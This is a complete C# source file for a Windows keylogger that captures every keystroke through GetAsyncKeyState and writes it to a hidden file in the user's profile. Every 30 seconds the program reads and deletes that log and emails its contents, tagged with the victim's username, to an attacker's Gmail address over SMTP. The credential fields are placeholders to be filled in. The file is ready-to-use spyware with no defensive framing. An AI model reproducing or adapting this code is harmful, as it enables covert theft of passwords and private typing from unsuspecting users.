using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using System.Net.Mail;

namespace CSharp
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private string LogPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\Keylogs.txt";
        private const string smurfEmail = "YOUR_SMURF_EMAIL@gmail.com";
        private const string smurfEmailPassword = "YOUR_SMURF_EMAIL_PASSWORD";
        private const string serverEmail = "YOUR_PERSONAL_EMAIL@gmail.com";

        static void Main(string[] args)
        {
            new Program().Start();
        }

        private void Start()
        {
            StartActionTimer();

            while (true)
            {
                for (int i = 32; i < 255; i++)
                {
                    int KeyState = GetAsyncKeyState(i);
                    if (KeyState == 32769)
                    {
                        WriteLogFile(DecodeKey(i));
                        Console.Write(DecodeKey(i));
                    }
                }
            }
        }

        private void StartActionTimer()
        {
            Timer t = new Timer();
            t.Interval = 30000;
            t.Elapsed += TimerAction;
            t.AutoReset = true;
            t.Enabled = true;
        }

        private void TimerAction(Object source, ElapsedEventArgs e)
        {
            string Content = ReadLogFile();

            if (Content != null)
                SendEmail(Content);
        }

        private string ReadLogFile()
        {
            if (File.Exists(LogPath))
            {
                StreamReader r = new StreamReader(LogPath);
                string content = r.ReadLine();
                r.Close();
                File.Delete(LogPath);
                return content;
            }
            else
            {
                return null;
            }
        }

        private void WriteLogFile(string Content)
        {
            StreamWriter LogFile = new StreamWriter(LogPath, true);
            File.SetAttributes(LogPath, FileAttributes.Hidden);
            LogFile.Write(Content);
            LogFile.Close();
        }

        private void SendEmail(string Body)
        {
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress(smurfEmail);
            mailMessage.To.Add(new MailAddress(serverEmail));

            mailMessage.Subject = Environment.UserName;
            mailMessage.Body = Body;
            mailMessage.IsBodyHtml = false;


            SmtpClient smtp = new SmtpClient();

            smtp.Host = "smtp.gmail.com";
            smtp.Port = 587;
            smtp.EnableSsl = true;
            smtp.Credentials = new System.Net.NetworkCredential(smurfEmail, smurfEmailPassword);

            smtp.Send(mailMessage);
        }

        private string DecodeKey(int Code)
        {
            switch (Code)
            {
                case 8: return "[Back]";
                case 9: return "[TAB]";
                case 13: return "[Enter]";
                case 19: return "[Pause]";
                case 20: return "[Caps Lock]";
                case 27: return "[Esc]";
                case 32: return " ";
                case 33: return "[Page Up]";
                case 34: return "[Page Down]";
                case 35: return "[End]";
                case 36: return "[Home]";
                case 37: return "Left]";
                case 38: return "[Up]";
                case 39: return "[Right]";
                case 40: return "[Down]";
                case 44: return "[Print Screen]";
                case 45: return "[Insert]";
                case 46: return "[Delete]";
                case 48: return "0";
                case 49: return "1";
                case 50: return "2";
                case 51: return "3";
                case 52: return "4";
                case 53: return "5";
                case 54: return "6";
                case 55: return "7";
                case 56: return "8";
                case 57: return "9";
                case 65: return "a";
                case 66: return "b";
                case 67: return "c";
                case 68: return "d";
                case 69: return "e";
                case 70: return "f";
                case 71: return "g";
                case 72: return "h";
                case 73: return "i";
                case 74: return "j";
                case 75: return "k";
                case 76: return "l";
                case 77: return "m";
                case 78: return "n";
                case 79: return "o";
                case 80: return "p";
                case 81: return "q";
                case 82: return "r";
                case 83: return "s";
                case 84: return "t";
                case 85: return "u";
                case 86: return "v";
                case 87: return "w";
                case 88: return "x";
                case 89: return "y";
                case 90: return "z";
                case 91: return "[Windows]";
                case 92: return "[Windows]";
                case 93: return "[List]";
                case 96: return "0";
                case 97: return "1";
                case 98: return "2";
                case 99: return "3";
                case 100: return "4";
                case 101: return "5";
                case 102: return "6";
                case 103: return "7";
                case 104: return "8";
                case 105: return "9";
                case 106: return "*";
                case 107: return "+";
                case 109: return "-";
                case 110: return ",";
                case 111: return "/";
                case 112: return "[F1]";
                case 113: return "[F2]";
                case 114: return "[F3]";
                case 115: return "[F4]";
                case 116: return "[F5]";
                case 117: return "[F6]";
                case 118: return "[F7]";
                case 119: return "[F8]";
                case 120: return "[F9]";
                case 121: return "[F10]";
                case 122: return "[F11]";
                case 123: return "[F12]";
                case 144: return "[Num Lock]";
                case 145: return "[Scroll Lock]";
                case 160: return "[Shift]";
                case 161: return "[Shift]";
                case 162: return "[Ctrl]";
                case 163: return "[Ctrl]";
                case 164: return "[Alt]";
                case 165: return "[Alt]";
                case 187: return "=";
                case 186: return "ç";
                case 188: return ",";
                case 189: return "-";
                case 190: return ".";
                case 192: return "'";
                case 191: return ";";
                case 193: return "/";
                case 194: return ".";
                case 219: return "´";
                case 220: return "]";
                case 221: return "[";
                case 222: return "~";
                case 226: return "\\";
                default: return "[" + Code + "]";
            }
        }
    }
}
